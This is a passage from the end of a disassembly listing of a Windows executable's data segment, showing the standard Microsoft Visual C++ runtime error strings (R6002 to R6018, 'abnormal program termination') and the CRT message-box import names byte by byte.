		db  65h	; e
		db  0Dh
		db  0Ah
		db    0
		db    0
		db    0
		db    0
		db  52h	; R
		db  36h	; 6
		db  30h	; 0
		db  31h	; 1
		db  38h	; 8
		db  0Dh
		db  0Ah
		db  2Dh	; -
		db  20h
		db  75h	; u
		db  6Eh	; n
		db  65h	; e
		db  78h	; x
		db  70h	; p
		db  65h	; e
		db  63h	; c
		db  74h	; t
		db  65h	; e
		db  64h	; d
		db  20h
		db  68h	; h
		db  65h	; e
		db  61h	; a
		db  70h	; p
		db  20h
		db  65h	; e
		db  72h	; r
		db  72h	; r
		db  6Fh	; o
		db  72h	; r
		db  0Dh
		db  0Ah
		db    0
		db    0
		db    0
		db    0
		db  52h	; R
		db  36h	; 6
		db  30h	; 0
		db  31h	; 1
		db  37h	; 7
		db  0Dh
		db  0Ah
		db  2Dh	; -
		db  20h
		db  75h	; u
		db  6Eh	; n
		db  65h	; e
		db  78h	; x
		db  70h	; p
		db  65h	; e
		db  63h	; c
		db  74h	; t
		db  65h	; e
		db  64h	; d
		db  20h
		db  6Dh	; m
		db  75h	; u
		db  6Ch	; l
		db  74h	; t
		db  69h	; i
		db  74h	; t
		db  68h	; h
		db  72h	; r
		db  65h	; e
		db  61h	; a
		db  64h	; d
		db  20h
		db  6Ch	; l
		db  6Fh	; o
		db  63h	; c
		db  6Bh	; k
		db  20h
		db  65h	; e
		db  72h	; r
		db  72h	; r
		db  6Fh	; o
		db  72h	; r
		db  0Dh
		db  0Ah
		db    0
		db    0
		db    0
		db    0
		db  52h	; R
		db  36h	; 6
		db  30h	; 0
		db  31h	; 1
		db  36h	; 6
		db  0Dh
		db  0Ah
		db  2Dh	; -
		db  20h
		db  6Eh	; n
		db  6Fh	; o
		db  74h	; t
		db  20h
		db  65h	; e
		db  6Eh	; n
		db  6Fh	; o
		db  75h	; u
		db  67h	; g
		db  68h	; h
		db  20h
		db  73h	; s
		db  70h	; p
		db  61h	; a
		db  63h	; c
		db  65h	; e
		db  20h
		db  66h	; f
		db  6Fh	; o
		db  72h	; r
		db  20h
		db  74h	; t
		db  68h	; h
		db  72h	; r
		db  65h	; e
		db  61h	; a
		db  64h	; d
		db  20h
		db  64h	; d
		db  61h	; a
		db  74h	; t
		db  61h	; a
		db  0Dh
		db  0Ah
		db    0
		db  0Dh
		db  0Ah
		db  61h	; a
		db  62h	; b
		db  6Eh	; n
		db  6Fh	; o
		db  72h	; r
		db  6Dh	; m
		db  61h	; a
		db  6Ch	; l
		db  20h
		db  70h	; p
		db  72h	; r
		db  6Fh	; o
		db  67h	; g
		db  72h	; r
		db  61h	; a
		db  6Dh	; m
		db  20h
		db  74h	; t
		db  65h	; e
		db  72h	; r
		db  6Dh	; m
		db  69h	; i
		db  6Eh	; n
		db  61h	; a
		db  74h	; t
		db  69h	; i
		db  6Fh	; o
		db  6Eh	; n
		db  0Dh
		db  0Ah
		db    0
		db    0
		db    0
		db    0
		db  52h	; R
		db  36h	; 6
		db  30h	; 0
		db  30h	; 0
		db  39h	; 9
		db  0Dh
		db  0Ah
		db  2Dh	; -
		db  20h
		db  6Eh	; n
		db  6Fh	; o
		db  74h	; t
		db  20h
		db  65h	; e
		db  6Eh	; n
		db  6Fh	; o
		db  75h	; u
		db  67h	; g
		db  68h	; h
		db  20h
		db  73h	; s
		db  70h	; p
		db  61h	; a
		db  63h	; c
		db  65h	; e
		db  20h
		db  66h	; f
		db  6Fh	; o
		db  72h	; r
		db  20h
		db  65h	; e
		db  6Eh	; n
		db  76h	; v
		db  69h	; i
		db  72h	; r
		db  6Fh	; o
		db  6Eh	; n
		db  6Dh	; m
		db  65h	; e
		db  6Eh	; n
		db  74h	; t
		db  0Dh
		db  0Ah
		db    0
		db  52h	; R
		db  36h	; 6
		db  30h	; 0
		db  30h	; 0
		db  38h	; 8
		db  0Dh
		db  0Ah
		db  2Dh	; -
		db  20h
		db  6Eh	; n
		db  6Fh	; o
		db  74h	; t
		db  20h
		db  65h	; e
		db  6Eh	; n
		db  6Fh	; o
		db  75h	; u
		db  67h	; g
		db  68h	; h
		db  20h
		db  73h	; s
		db  70h	; p
		db  61h	; a
		db  63h	; c
		db  65h	; e
		db  20h
		db  66h	; f
		db  6Fh	; o
		db  72h	; r
		db  20h
		db  61h	; a
		db  72h	; r
		db  67h	; g
		db  75h	; u
		db  6Dh	; m
		db  65h	; e
		db  6Eh	; n
		db  74h	; t
		db  73h	; s
		db  0Dh
		db  0Ah
		db    0
		db    0
		db    0
		db  52h	; R
		db  36h	; 6
		db  30h	; 0
		db  30h	; 0
		db  32h	; 2
		db  0Dh
		db  0Ah
		db  2Dh	; -
		db  20h
		db  66h	; f
		db  6Ch	; l
		db  6Fh	; o
		db  61h	; a
		db  74h	; t
		db  69h	; i
		db  6Eh	; n
		db  67h	; g
		db  20h
		db  70h	; p
		db  6Fh	; o
		db  69h	; i
		db  6Eh	; n
		db  74h	; t
		db  20h
		db  6Eh	; n
		db  6Fh	; o
		db  74h	; t
		db  20h
		db  6Ch	; l
		db  6Fh	; o
		db  61h	; a
		db  64h	; d
		db  65h	; e
		db  64h	; d
		db  0Dh
		db  0Ah
		db    0
		db    0
		db    0
		db    0
aMicrosoftVisua	db 'Microsoft Visual C++ Runtime Library',0 ; DATA XREF: __NMSG_WRITE+119o
		align 10h
; char asc_40D590[]
asc_40D590	db 0Ah			; DATA XREF: __NMSG_WRITE+F1o
		db 0Ah,0
		align 4
; char aRuntimeErrorPr[]
aRuntimeErrorPr	db 'Runtime Error!',0Ah ; DATA XREF: __NMSG_WRITE+D3o
		db 0Ah
		db 'Program: ',0
		align 10h
; char a___[]
a___		db '...',0              ; DATA XREF: __NMSG_WRITE+BFo
; char aProgramNameUnk[]
aProgramNameUnk	db '<program name unknown>',0 ; DATA XREF: __NMSG_WRITE+7Do
		db    0
		db    0
		db    0
		db    0
		db    0
unk_40D5D0	db 0FFh			; DATA XREF: ___crtGetStringTypeA+5o
		db 0FFh
		db 0FFh
		db 0FFh
		db 0D1h	; Ñ
		db 0ABh	; «
		db  40h	; @
		db    0
		db 0D5h	; Õ
		db 0ABh	; «
		db  40h	; @
		db    0
; char aGetlastactivep[]
aGetlastactivep	db 'GetLastActivePopup',0 ; DATA XREF: ___crtMessageBoxA+3Do
		align 10h
; char aGetactivewindo[]
aGetactivewindo	db 'GetActiveWindow',0  ; DATA XREF: ___crtMessageBoxA+35o
; char aMessageboxa[]
aMessageboxa	db 'MessageBoxA',0      ; DATA XREF: ___crtMessageBoxA+24o
; char aUser32_dll[]
aUser32_dll	db 'user32.dll',0       ; DATA XREF: ___crtMessageBoxA+Do
		align 4
aR		db 'àÖ',0
		db    ?	;
dword_493464	dd ?			; DATA XREF: __setmbcp+6Ew
					; __setmbcp+12Bw ...
dword_493468	dd ?			; DATA XREF: start+7Aw	__wincmdln+Fr ...
_data		ends


		end start
